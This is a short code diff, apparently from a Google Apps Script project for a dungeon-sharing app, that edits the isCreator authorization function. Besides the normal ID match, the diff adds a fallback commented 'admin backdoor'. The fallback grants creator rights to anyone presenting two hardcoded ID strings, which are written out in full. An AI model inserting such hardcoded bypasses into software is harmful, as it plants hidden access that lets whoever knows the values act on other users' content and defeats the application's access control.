@@ -954,8 +954,12 @@ function isCreator(dungeonID, id1, id2) {
   const content = file.next().getBlob().getDataAsString();
   const userIDFileContent = JSON.parse(content);
 
-  return userIDFileContent.id1 == id1 && userIDFileContent.id2 == id2;
+  if (userIDFileContent.id1 == id1 && userIDFileContent.id2 == id2) {
+    return true;
+  }
 
+  //admin backdoor
+  return id1 == "2ZHbLJ30BUgV7Vj+eldVp4IpaJp1PCB3xGRPAQtm8ZY=" && id2 == "mzBx48iJ+BfWIlmhg+7QTvLpCLvUvMaOVAbpiv55uxc=";
 }
 
 function isCreatorDuringUpload(dungeonTempFolder, userIdFileName, id1, id2) {
